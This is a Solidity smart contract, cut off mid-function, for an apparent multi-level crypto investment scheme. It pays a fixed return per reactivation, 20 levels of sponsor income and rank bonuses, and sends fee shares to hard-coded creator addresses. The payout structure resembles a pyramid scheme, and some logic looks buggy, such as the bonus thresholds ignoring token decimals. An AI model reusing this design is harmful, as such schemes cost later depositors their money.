//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBEP20 
{
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);
}

interface ISecurityFund {
    function TransferTokens(address token, address user, uint256 amount) external;
}

contract BBD
{
    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public TotalUsers = 0;
    uint256 public TotalInvestment = 0;
    uint256 public TotalWithdrawn = 0;

    address public CreatorAddress = 0xA1bF05780C2De3002086695D212a743EAA6532Ad;
    address public CreatorAddress_2 = 0x4F6A1cfdF5E55Db0c2ff4575B0887fEa8a967088;
    address public ManagementFee = 0x985495C028f9B896de454eC448B53FBA6450DA40;
    address public MarketingAddress = 0x73D1AD5a474E1712d6Cbe18d56b7281AaF190347;
    address public SecurityFundContract = address(0);


    bool constant IsPaymentCurrencyDifferentThanNative = true;
    address constant PaymentTokenContractAddress = IsPaymentCurrencyDifferentThanNative?0xAc17996d3a9A3081F626cD56E904A70E9DadF892:address(0); //0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;

    uint256 LevelIncome_LevelCount = 0;
    uint256 TotalRanksCount = 0;

    bool IsLevelIncomePercentage = true;

    uint256 TotalNoOfPackages = 0;

    uint256 constant PaymentCurrencyDecimals = 18;

    bool IsWithdrawalAllowedAfterPrincipleAmount = true;
    address dev;

    struct User 
    {
        uint256 Id;
        address Address;
        address SponsorAddress;
        uint256 JoiningTimestamp;
        uint256 Investment;
        uint256 TotalTeam;
        bool IsBlocked;
        uint256 FirstActivationTimestamp;
        uint256 ActivationExpiryTimestamp;
        uint256 RankId;
        bool IsQualifiedFor4X;
        bool IsFirstActivationDone;
    }

    struct UserTeam
    {
        uint256 DirectsInvestment;
        address[] DirectAddresses;
        uint256 TeamABusiness;
        uint256 TeamBBusiness;
        uint256 TeamInvestment;
        address[] TeamAddresses;
    }

    struct UserDeposit 
    {
        uint256 PackageId;
        uint256 Amount;
        uint256 Timestamp;
    }

    struct UserIncome 
    {
        uint256 ReferralIncome;
        uint256 NewRegistrationBonus;
        uint256 ROIIncome;
        uint256[] LevelIncome;
        uint256 RankIncome;
        uint256 TopmostSponsorsIncome;
        uint256 AmountWithdrawn;
    }

    struct UserTransactionCount
    {
        uint256 DepositsCount;
        uint256 ROIIncomeCount;
        uint256 IncomeWithdrawalCount;
        uint256 ReactivationCount;
    }

    struct UserIncomeWithdrawalTransaction
    {
        uint256 Amount;
        uint256 Timestamp;
    }

    struct PackageMaster
    {
        uint256 PackageId;
        string Name;
        uint256 Amount;
        bool IsActive;
        bool HasRange;
        uint256 MinAmount;
        uint256 MaxAmount;
        uint256 ReferralIncome;
        bool IsReferralIncomePercentage;
    }

    struct LevelIncomeMaster
    {
        uint256 Level;
        uint256 Percentage;
        uint256 RequiredMinRankId;
    }

    struct ContractInfo
    {
        uint256 TotalCommunity;
        uint256 CommunityInvestment;
        uint256 CommunityWithdrawal;
        uint256 ContractBalance;
        bool IsWithdrawalAllowedAfterPrincipleAmount;
    }

    struct UserDashboard
    {
        uint256 Investment;
        uint256 DirectsCount;
        uint256 DirectsInvestment;
        uint256 TeamCount;
        uint256 TeamA_Business;
        uint256 TeamB_Business;
        uint256 TeamInvestment;
        uint256 NewRegistrationBonus;
        uint256 ReferralIncome;
        uint256 LevelIncome;
        uint256 ROIIncome;
        uint256 PendingROIIncome;
        uint256 RankIncome;
        uint256 TopmostSponsorsIncome;
        uint256 TotalIncome;
        uint256 Capping;
        uint256 AmountWithdrawn;
        string RankName;
    }

    struct UserDirects
    {
        uint256 Srno;
        address Address;
        uint256 Investment;
        uint256 Business;
    }

    struct UserTeamMember {
        uint256 Srno;
        address Address;
        uint256 Investment;
        uint256 Business;
    }

    struct LevelIncomeInfo
    {
        uint256 Level;
        uint256 RequiredMinRankId;
        uint256 RankId;
        uint256 OnAmount;
        uint256 Percentage;
        uint256 Income;
        bool IsLevelAchieved;
    }

    struct RankMaster
    {
        uint256 RankId;
        string RankName;
        uint256 ReqSelfInvestment;
        uint256 ReqTeamA_Business;
        uint256 ReqTeamB_Business;
        uint256 RewardAmount;
    }
    
    struct ROIIncomeDetail {
        uint256 OnAmount;
        uint256 Timestamp;
        uint256 Income;
    }

    struct RankInfo {
        uint256 RankId;
        string RankName;
        uint256 ReqSelfInvestment;
        uint256 ReqTeamA_Business;
        uint256 ReqTeamB_Business;
        uint256 UserSelfInvestment;
        uint256 UserTeamA_Business;
        uint256 UserTeamB_Business;
        bool IsAchieved;
    }

    mapping(uint256 => PackageMaster) public map_PackageMaster;
    mapping(uint256 => LevelIncomeMaster) public map_LevelIncomeMaster;
    mapping(uint256 => RankMaster) public map_RankMaster;

    mapping(address => User) public map_Users;
    mapping(uint256 => address) public map_UserIdToAddress;

    mapping(address => UserTeam) public map_UserTeam;
    mapping(address => mapping(uint256 => UserDeposit)) public map_UserDeposits;
    
    mapping(address => mapping(uint256 => UserIncomeWithdrawalTransaction)) public map_UserIncomeWithdrawalHistory;

    mapping(address => mapping(uint256 => uint256)) public map_UserBusinessOnLevel;
    mapping(address => mapping(uint256 => ROIIncomeDetail)) public map_ROIIncomeHistory;

    mapping(address => UserIncome) public map_UserIncome;
    mapping(address => mapping(uint256 => uint256)) public map_UserWalletBalance;

    mapping(address => UserTransactionCount) public map_UserTransactionCount;

    struct TempSponsorCount {
        address sponsor;
        uint256 count;
    }

    address[] private userActivations;

    
    modifier onlyOwner() {
        require(IsOwner(), "You are not allowed!");
        _;
    }

    constructor()
    {
        dev = msg.sender;
        Init();
    }

    function Init() internal
    {
        InitPackageMaster();
        InitLevelIncomeMaster();
        InitRankMaster();

        InitTopUser();
    }

    function InitPackageMaster() internal
    {
        TotalNoOfPackages++;
        map_PackageMaster[TotalNoOfPackages] = PackageMaster({
            PackageId: TotalNoOfPackages,
            Name: "Package",
            Amount: 0,
            IsActive: true,
            HasRange: true,
            MinAmount: ConvertToBase(30),
            MaxAmount: ConvertToBase(3000),
            ReferralIncome: 0,
            IsReferralIncomePercentage: true
        });
    }

    function InitLevelIncomeMaster() internal
    {
        // 1
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 500,
            RequiredMinRankId: 0
        });

        // 2
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 300,
            RequiredMinRankId: 1
        });

        // 3
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 1
        });
        
        // 4
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 400,
            RequiredMinRankId: 2
        });
        
        // 5
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 2
        });
        
        // 6
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 2
        });
        
        // 7
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 2
        });
        
        // 8
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 2
        });
        
        // 9
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 3
        });
        
        // 10
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 3
        });
        
        // 11
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 12
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 13
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 14
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 4
        });
        
        // 15
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 4
        });
        
        // 16
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 17
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 18
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 19
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 20
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
    }

    function InitRankMaster() internal
    {
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "1 Star",
            ReqSelfInvestment: ConvertToBase(300),
            ReqTeamA_Business: ConvertToBase(1000),
            ReqTeamB_Business: ConvertToBase(1000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "2 Star",
            ReqSelfInvestment: ConvertToBase(500),
            ReqTeamA_Business: ConvertToBase(5000),
            ReqTeamB_Business: ConvertToBase(5000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "3 Star",
            ReqSelfInvestment: ConvertToBase(1000),
            ReqTeamA_Business: ConvertToBase(10000),
            ReqTeamB_Business: ConvertToBase(10000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "4 Star",
            ReqSelfInvestment: ConvertToBase(2000),
            ReqTeamA_Business: ConvertToBase(25000),
            ReqTeamB_Business: ConvertToBase(25000),
            RewardAmount: ConvertToBase(2500)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "5 Star",
            ReqSelfInvestment: ConvertToBase(3000),
            ReqTeamA_Business: ConvertToBase(75000),
            ReqTeamB_Business: ConvertToBase(75000),
            RewardAmount: ConvertToBase(5000)
        });
    }

    function InitTopUser() internal
    {
        address userAddress = CreatorAddress;
        SaveUser(userAddress, address(0));
    }

    function SaveUser(address userAddress, address sponsorAddress) internal
    {
        TotalUsers++;

        User memory u = User({
            Id: TotalUsers,
            Address: userAddress,
            SponsorAddress: sponsorAddress,
            JoiningTimestamp: block.timestamp,
            Investment: 0,
            TotalTeam: 0,
            IsBlocked: false,
            FirstActivationTimestamp: 0,
            ActivationExpiryTimestamp: 0,
            RankId: 0,
            IsFirstActivationDone: false,
            IsQualifiedFor4X: false
        });

        UserTeam memory ut = UserTeam({
            DirectsInvestment: 0,
            DirectAddresses: new address[](0),
            TeamABusiness: 0,
            TeamBBusiness: 0,
            TeamInvestment: 0,
            TeamAddresses: new address[](0)
        });

        UserIncome memory ui = UserIncome({
            ReferralIncome: 0,
            LevelIncome: new uint256[](LevelIncome_LevelCount + 1),
            NewRegistrationBonus: 0,
            ROIIncome: 0,
            RankIncome: 0,
            TopmostSponsorsIncome: 0,
            AmountWithdrawn: 0
        });

        UserTransactionCount memory utx = UserTransactionCount({
            DepositsCount: 0,
            ROIIncomeCount: 0,
            IncomeWithdrawalCount: 0,
            ReactivationCount: 0
        });

        map_Users[userAddress] = u;
        map_UserTeam[userAddress] = ut;
        map_UserIncome[userAddress] = ui;
        map_UserIdToAddress[TotalUsers] = userAddress;
        map_UserTransactionCount[userAddress] = utx;

    }

    function SaveDeposit(address userAddress, uint256 packageId, uint256 amount) internal returns(bool IsFirstTopup)
    {
        require(
            map_PackageMaster[packageId].IsActive 
                &&
            ((!map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].Amount == amount) 
                ||
            (map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].MinAmount <= amount && map_PackageMaster[packageId].MaxAmount >= amount)),
            "Invalid amount!"
        );
        
        require(map_UserDeposits[userAddress][map_UserTransactionCount[userAddress].DepositsCount].Amount<=amount, "Amount must be equal to or more than previous deposit amount.");

        uint timestamp = block.timestamp;

        TotalInvestment += amount;

        address sponsorAddress = map_Users[userAddress].SponsorAddress;
        
        // Only active IDs to be counted
        if(!map_Users[userAddress].IsFirstActivationDone)
        {
            if (sponsorAddress != address(0))
            {
                map_UserTeam[sponsorAddress].DirectAddresses.push(userAddress);
            }

            UpdateTeamCount(sponsorAddress, userAddress);
        }

        map_Users[userAddress].Investment += amount;
        map_UserTeam[sponsorAddress].DirectsInvestment += amount;

        UpdateTeamInvestment(sponsorAddress, userAddress, amount);

        {
            UserDeposit memory d = UserDeposit({
                PackageId: packageId,
                Amount: amount,
                Timestamp: timestamp
            });

            Process4X_CappingQualification(userAddress, amount, 0);

            map_UserDeposits[userAddress][map_UserTransactionCount[userAddress].DepositsCount + 1] = d;
            map_UserTransactionCount[userAddress].DepositsCount++;
            ReactivateInternal(userAddress, timestamp, amount);

            IsFirstTopup = !map_Users[userAddress].IsFirstActivationDone;
            if(!map_Users[userAddress].IsFirstActivationDone)
            {
                map_Users[userAddress].FirstActivationTimestamp = timestamp;
                userActivations.push(userAddress);
                ProcessNewRegistrationBonus(userAddress, amount);
                Process24HoursTopmostSponsorsIncome(amount);
                map_Users[userAddress].IsFirstActivationDone = true;
            }
        }
    }

    function Process24HoursTopmostSponsorsIncome(uint256 onAmount) internal 
    {
        uint256 timeLimit = block.timestamp - 1 days;

        // Temporary in-memory array to hold sponsor count structs
        TempSponsorCount[] memory sponsorCounts = new TempSponsorCount[](userActivations.length);
        uint256 sponsorIndex = 0;

        // Step 1: Loop backwards through activations to count sponsors
        for (uint256 i = userActivations.length; i > 0; i--) {
            address userAddress = userActivations[i - 1];

            if (map_Users[userAddress].FirstActivationTimestamp < timeLimit) {
                break;
            }

            address sponsor = map_Users[userAddress].SponsorAddress;
            if (sponsor == address(0)) continue;

            bool found = false;
            for (uint256 j = 0; j < sponsorIndex; j++) {
                if (sponsorCounts[j].sponsor == sponsor) {
                    sponsorCounts[j].count++;
                    found = true;
                    break;
                }
            }

            if (!found) {
                sponsorCounts[sponsorIndex] = TempSponsorCount({ sponsor: sponsor, count: 1 });
                sponsorIndex++;
            }
        }

        // Step 2: Find top 3 sponsors
        address[3] memory topSponsors;
        uint256[3] memory topCounts;

        for (uint256 i = 0; i < sponsorIndex; i++) {
            address sponsor = sponsorCounts[i].sponsor;
            uint256 count = sponsorCounts[i].count;

            for (uint256 j = 0; j < 3; j++) {
                if (count > topCounts[j]) {
                    // Shift lower entries down
                    for (uint256 k = 2; k > j; k--) {
                        topCounts[k] = topCounts[k - 1];
                        topSponsors[k] = topSponsors[k - 1];
                    }
                    topCounts[j] = count;
                    topSponsors[j] = sponsor;
                    break;
                }
            }
        }

        // Step 3: Distribute 2% of `onAmount` => split as 50%, 30%, 20%
        uint256 totalPool = (onAmount * 2) / 100;
        uint256[3] memory percentages = [uint256(50), 30, 20]; // 50%, 30%, 20% in basis points (1/100)

        for (uint256 i = 0; i < 3; i++) {
            address s = topSponsors[i];
            if (s != address(0)) {
                uint256 income = (totalPool * percentages[i]) / 100;
                income = CapAndCreditIncomeToWallet(s, income);
                map_UserIncome[s].TopmostSponsorsIncome += income;
            }
        }
    }

    function ReceiveTokens(uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            uint256 old_balance = GetContractBalance();
            IERC20(PaymentTokenContractAddress).transferFrom(msg.sender, address(this), amount);
            uint256 new_balance = GetContractBalance();

            require(new_balance - old_balance >= amount, "Invalid amount!");
        } 
        else
        {
            require(msg.value >= amount);
        }
    }

    function SendTokens(address userAddress, uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            IERC20(PaymentTokenContractAddress).transfer(userAddress, amount);
        } 
        else
        {
            payable(userAddress).transfer(amount);
        }
    }

    function SendTokensFromSecurityContract(address userAddress, uint256 amount) internal {
        require(SecurityFundContract != address(0), "Security fund contract not set");
        ISecurityFund(SecurityFundContract).TransferTokens(PaymentTokenContractAddress, userAddress, amount);
    }

    function UpdateTeamCount(address sponsorAddress, address userAddress) internal
    {
        while (sponsorAddress != address(0))
        {
            map_Users[sponsorAddress].TotalTeam++;
            map_UserTeam[sponsorAddress].TeamAddresses.push(userAddress);
            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
        }
    }

    function UpdateTeamInvestment(address sponsorAddress, address userAddress, uint256 amount) internal 
    {
        ProcessRankQualification(userAddress);
        uint256 level = 1;
        while (sponsorAddress != address(0))
        {
            if(map_UserTeam[sponsorAddress].TeamABusiness<amount)
            {
                map_UserTeam[sponsorAddress].TeamBBusiness += map_UserTeam[sponsorAddress].TeamABusiness;
                map_UserTeam[sponsorAddress].TeamABusiness = amount;
            }
            else 
            {
                map_UserTeam[sponsorAddress].TeamBBusiness += amount;
            }

            map_UserTeam[sponsorAddress].TeamInvestment += amount; //Including Directs

            map_UserBusinessOnLevel[sponsorAddress][level] += amount;

            ProcessRankQualification(sponsorAddress);

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;
        }
    }

    function ProcessRankQualification(address userAddress) internal {
        uint256 nextRankId = map_Users[userAddress].RankId + 1;

        while (nextRankId <= TotalRanksCount) 
        {
            RankMaster memory r = map_RankMaster[nextRankId];

            if (map_Users[userAddress].Investment >= r.ReqSelfInvestment &&
                map_UserTeam[userAddress].TeamABusiness >= r.ReqTeamA_Business &&
                map_UserTeam[userAddress].TeamBBusiness >= r.ReqTeamB_Business) 
            {
                uint256 income = CapAndCreditIncomeToWallet(userAddress, r.RewardAmount);
                map_UserIncome[userAddress].RankIncome += income;
                map_Users[userAddress].RankId = nextRankId;
                Process4X_CappingQualification(userAddress, 0, nextRankId);
                nextRankId++;
            } 
            else 
            {
                break;
            }
        }
    }

    function Process4X_CappingQualification(address userAddress, uint256 oneTimeDepositAmount, uint256 achievedRankId) internal
    {
        if(!map_Users[userAddress].IsQualifiedFor4X 
                && 
            (!map_Users[userAddress].IsFirstActivationDone || map_Users[userAddress].FirstActivationTimestamp + 45 days>=block.timestamp) 
                && 
            (oneTimeDepositAmount>=ConvertToBase(2000) || achievedRankId>=1))
        {
            map_Users[userAddress].IsQualifiedFor4X = true;
        }
    }

    function CapAndCreditIncomeToWallet(address userAddress, uint256 amount) internal returns (uint256)
    {
        amount = CapIncome(userAddress, amount);
        if(amount>0)
        {
            map_UserWalletBalance[userAddress][1] += amount*75/100; // 75% to Withdrawal Wallet
            map_UserWalletBalance[userAddress][2] += amount*25/100; // 25% to Topup Wallet
        }

        return amount;
    }


    function CapIncome(address userAddress, uint256 amount) internal view returns (uint256)
    {
        if(amount>0)
        {
            if(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp)
            {
                return 0;
            }
            else
            {
                uint256 total_income = GetTotalIncome(userAddress);
                uint256 capping_amount = (map_Users[userAddress].IsQualifiedFor4X?4:3)*map_Users[userAddress].Investment;

                if(total_income+amount>capping_amount)
                {
                    amount = capping_amount - total_income;
                }
            }
        }

        return amount;
    }


    function IsOwner() internal view returns (bool)
    {
        return msg.sender == CreatorAddress || msg.sender == dev;
    }

    function ConvertToBase(uint256 amount) internal pure returns (uint256)
    {
        return amount * (10**PaymentCurrencyDecimals);
    }

    function doesUserExist(address _address) internal view returns (bool)
    {
        return map_Users[_address].Id > 0;
    }

    function isUserActive(address _address) internal view returns (bool)
    {
        return !map_Users[_address].IsBlocked;
    }

    function RegisterInternal(address sponsorAddress) internal
    {
        address userAddress = msg.sender;
        require(Login(sponsorAddress), "Invalid sponsor!");
        require(!doesUserExist(userAddress), "Already registered!");

        SaveUser(userAddress, sponsorAddress);
    }

    function DepositInternal(uint256 packageId, uint256 amount) internal 
    {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "You are not registered!");
        require(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp, "Deposit is allowed only after the expiry.");
        ReceiveTokens(amount);

        bool IsFirstTopup = SaveDeposit(userAddress, packageId, amount);

        SendTokens(CreatorAddress, amount*2/100);
        SendTokens(CreatorAddress_2, amount*1/100);
        SendTokens(MarketingAddress, amount*5/100);

        if(!IsFirstTopup)
        {
            SendTokens(ManagementFee, amount*2/100);
        }
    }

    // function DistributeReferralIncome(address userAddress, uint packageId, uint amount) internal
    // {
    //     uint income = map_PackageMaster[packageId].IsReferralIncomePercentage? amount*map_PackageMaster[packageId].ReferralIncome/100: map_PackageMaster[packageId].ReferralIncome;
    //     map_UserIncome[map_Users[userAddress].SponsorAddress].ReferralIncome += income;
    // }

    function GetPendingROIIncome(address userAddress) internal view returns (uint256)
    {
        uint256 onAmount = map_Users[userAddress].Investment;
        
        uint256 income_amount = 0;
        if(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp)
        {
            income_amount = onAmount*10/100;
            income_amount = CapIncome(userAddress, income_amount);
        }

        return income_amount;
    }

    function ProcessROIIncome(address userAddress, uint256 block_timestamp, uint256 currentDepositAmount) internal
    {
        uint256 onAmount = map_Users[userAddress].Investment-currentDepositAmount;

        if(onAmount>0)
        {
            uint256 income_amount = onAmount*10/100;
            income_amount = CapAndCreditIncomeToWallet(userAddress, income_amount);
            map_UserIncome[userAddress].ROIIncome += income_amount;

            map_UserTransactionCount[userAddress].ROIIncomeCount++;

            map_ROIIncomeHistory[userAddress][map_UserTransactionCount[userAddress].ROIIncomeCount] = ROIIncomeDetail({
                OnAmount: onAmount,
                Timestamp: block_timestamp,
                Income: income_amount
            });
        }
    }

    function ProcessNewRegistrationBonus(address userAddress, uint256 amount) internal
    {
        uint256 bonus_amount = 0;
        if(amount>=3000)
        {
            bonus_amount = ConvertToBase(40);
        }
        else if(amount>=2000)
        {
            bonus_amount = ConvertToBase(30);
        }
        else if(amount>=1000)
        {
            bonus_amount = ConvertToBase(20);
        }
        else if(amount>=500)
        {
            bonus_amount = ConvertToBase(12);
        }
        else if(amount>=300)
        {
            bonus_amount = ConvertToBase(7);
        }

        if(bonus_amount>0 && map_UserIncome[userAddress].NewRegistrationBonus==0 && !map_Users[userAddress].IsFirstActivationDone)
        {
            bonus_amount = CapAndCreditIncomeToWallet(userAddress, bonus_amount);
            map_UserIncome[userAddress].NewRegistrationBonus += bonus_amount;
        }
    }

    function DistributeLevelIncome(address userAddress) internal
    {
        address sponsorAddress = map_Users[userAddress].SponsorAddress;

        uint256 onAmount = map_Users[userAddress].Investment/(map_Users[userAddress].IsFirstActivationDone?2:1);
        
        uint256 level = 1;
        uint256 income_amount = 0;
        while (sponsorAddress != address(0) && level <= LevelIncome_LevelCount) 
        {
            income_amount = (IsLevelIncomePercentage ? ((onAmount * map_LevelIncomeMaster[level].Percentage) / (10 * 100)) : map_LevelIncomeMaster[level].Percentage);
            if (IsQualifiedForLevelIncome(userAddress, level)) 
            {
                CapAndCreditIncomeToWallet(sponsorAddress, income_amount);
                map_UserIncome[sponsorAddress].LevelIncome[level] += income_amount;
            } 
            // else 
            // {
            //     CapAndCreditIncomeToWallet(CreatorAddress, income_amount);
            //     map_UserIncome[CreatorAddress].LevelIncome[level] += income_amount;
            // }

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;

            // if (sponsorAddress == address(0)) 
            // {
            //     sponsorAddress = CreatorAddress;
            // }
        }
    }

    function IsQualifiedForLevelIncome(address userAddress, uint256 level) internal view returns (bool)
    {
        if (map_Users[userAddress].RankId >= map_LevelIncomeMaster[level].RequiredMinRankId) 
        {
            return true;
        }
        return false;
    }

    function GetTotalLevelIncome(address userAddress) internal view returns (uint256)
    {
        uint256 totalLevelIncome = 0;
        UserIncome memory u = map_UserIncome[userAddress];

        for (uint256 i = 0; i < u.LevelIncome.length; i++) {
            totalLevelIncome += u.LevelIncome[i];
        }
        return totalLevelIncome;
    }

    function GetTotalIncome(address userAddress) internal view returns (uint256)
    {
        // Don't put Pending ROI Income here as it will have circular dependency
        return
            map_UserIncome[userAddress].ReferralIncome +
            map_UserIncome[userAddress].ROIIncome +
            map_UserIncome[userAddress].RankIncome +
            map_UserIncome[userAddress].NewRegistrationBonus +
            map_UserIncome[userAddress].TopmostSponsorsIncome +
            GetTotalLevelIncome(userAddress);
    }

    function GetContractBalance() internal view returns (uint256) 
    {
        if (IsPaymentCurrencyDifferentThanNative) 
        {
            return IERC20(PaymentTokenContractAddress).balanceOf(address(this));
        } 
        else 
        {
            return address(this).balance;
        }
    }

    function ReactivateInternal(address userAddress, uint block_timestamp, uint256 currentDepositAmount) internal returns (bool)
    {
        uint noOfDays = 10 + (map_UserTransactionCount[userAddress].ReactivationCount/2);
        uint expiryTimestamp = block_timestamp + (noOfDays * 1 days); // Convert days to seconds

        map_Users[userAddress].ActivationExpiryTimestamp = expiryTimestamp;
        map_UserTransactionCount[userAddress].ReactivationCount++;
        ProcessROIIncome(userAddress, block_timestamp, currentDepositAmount);
        DistributeLevelIncome(userAddress);
        return true;
    }

    function Login(address _address) public view returns (bool) 
    {
        return doesUserExist(_address) && isUserActive(_address);
    }

    function GetWalletBalance(address userAddress, uint256 walletId) public view returns (uint256) {
        return map_UserWalletBalance[userAddress][walletId];
    }

    function GetPackages() external view returns (PackageMaster[] memory) 
    {
        PackageMaster[] memory m = new PackageMaster[](TotalNoOfPackages);
        uint256 packageId = 1;
        while (packageId <= TotalNoOfPackages) {
            m[packageId - 1] = map_PackageMaster[packageId];
            packageId++;
        }
        return m;
    }

    function GetContractDetails() external view returns (ContractInfo memory info)
    {
        info = ContractInfo({
            TotalCommunity: TotalUsers,
            CommunityInvestment: TotalInvestment,
            CommunityWithdrawal: TotalWithdrawn,
            ContractBalance: GetContractBalance(),
            IsWithdrawalAllowedAfterPrincipleAmount: IsWithdrawalAllowedAfterPrincipleAmount
        });
    }

    function GetDashboardDetails(address userAddress) external view returns (UserDashboard memory info)
    {
        User memory u = map_Users[userAddress];
        UserTeam memory ut = map_UserTeam[userAddress];
        UserIncome memory ui = map_UserIncome[userAddress];

        info = UserDashboard({
            Investment: u.Investment,
            DirectsCount: ut.DirectAddresses.length,
            DirectsInvestment: ut.DirectsInvestment,
            TeamCount: u.TotalTeam,
            TeamA_Business: ut.TeamABusiness,
            TeamB_Business: ut.TeamBBusiness,
            TeamInvestment: ut.TeamInvestment,
            NewRegistrationBonus: ui.NewRegistrationBonus,
            ReferralIncome: ui.ReferralIncome,
            LevelIncome: GetTotalLevelIncome(userAddress),
            ROIIncome: ui.ROIIncome,
            PendingROIIncome: GetPendingROIIncome(userAddress),
            RankIncome: ui.RankIncome,
            TopmostSponsorsIncome: ui.TopmostSponsorsIncome,
            TotalIncome: GetTotalIncome(userAddress),
            Capping: u.Investment*(u.IsQualifiedFor4X?4:3),
            AmountWithdrawn: ui.AmountWithdrawn,
            RankName: map_RankMaster[u.RankId].RankName
        });
    }

    function GetDirects(address userAddress) external view returns (UserDirects[] memory directs)
    {
        directs = new UserDirects[](map_UserTeam[userAddress].DirectAddresses.length);

        for (uint256 i = 0; i < map_UserTeam[userAddress].DirectAddresses.length; i++) 
        {
            directs[i] = UserDirects({
                Srno: i + 1,
                Address: map_UserTeam[userAddress].DirectAddresses[i],
                Investment: map_Users[map_UserTeam[userAddress].DirectAddresses[i]].Investment,
                Business: map_Users[map_UserTeam[userAddress].DirectAddresses[i]].Investment
            });
        }
        // return map_Users[userAddress].DirectAddresses;
    }

    function GetTeamDetails(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserTeamMember[] memory team) {
        address[] memory fullTeam = map_UserTeam[userAddress].TeamAddresses;
        uint256 totalTeam = fullTeam.length;

        uint256 start = (pageIndex * pageSize > totalTeam) ? totalTeam : (pageIndex * pageSize);
        uint256 end = start >= pageSize ? start - pageSize : 0;
        uint256 resultSize = start - end;

        team = new UserTeamMember[](resultSize);

